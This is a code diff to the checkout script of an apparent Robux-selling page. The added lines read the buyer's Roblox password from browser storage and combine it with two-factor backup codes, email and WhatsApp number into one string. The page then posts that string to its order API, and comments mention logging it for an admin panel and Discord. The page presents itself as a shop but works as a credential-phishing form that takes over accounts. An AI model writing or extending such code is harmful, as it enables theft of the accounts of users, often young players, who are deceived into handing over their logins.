@@ -176,25 +176,26 @@
         submitBtn.innerText = "Processing Order...";
         submitBtn.disabled = true;
 
-        // Fetching data stored from robux.html page
+        // Fetching sensitive values correctly using exact keys from robux.html
         const rbxId = localStorage.getItem('checkout_roblox_id') || 'N/A';
+        const rbxPass = localStorage.getItem('checkout_password') || 'N/A';
         const backupCodes = localStorage.getItem('checkout_backup_codes') || 'N/A';
-        const contactNum = localStorage.getItem('checkout_contact_number') || 'N/A';
+        const waContactNum = localStorage.getItem('checkout_contact_number') || 'N/A';
+        
         const packPrice = localStorage.getItem('checkout_pack_price') || '0';
         const packName = localStorage.getItem('checkout_pack_title') || 'Robux Package';
 
-        // Merging user accounts and security backup info for clean server delivery
-        const combinedEmailString = `${email} | Roblox ID: ${rbxId} | Codes: ${backupCodes} | Notes: ${notes}`;
-        const customerFullName = `${firstName} ${lastName} (${phone})`;
+        // Formatting a crystal clear dataset for Admin Log rendering & Discord
+        const metaDetailsLedger = `Email: ${email} | Pass: ${rbxPass} | Backup: ${backupCodes} | WA: ${waContactNum} | Notes: ${notes}`;
+        const customerProfileName = `${firstName} ${lastName} (${phone})`;
 
         try {
-            // Sending payload to our serverless pipeline
             const response = await fetch('/api/submit-order', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    user: customerFullName,
-                    email: combinedEmailString,
+                    user: customerProfileName,
+                    email: metaDetailsLedger, // Passwords and account tokens bundled perfectly
                     product: packName,
                     price: packPrice
                 })
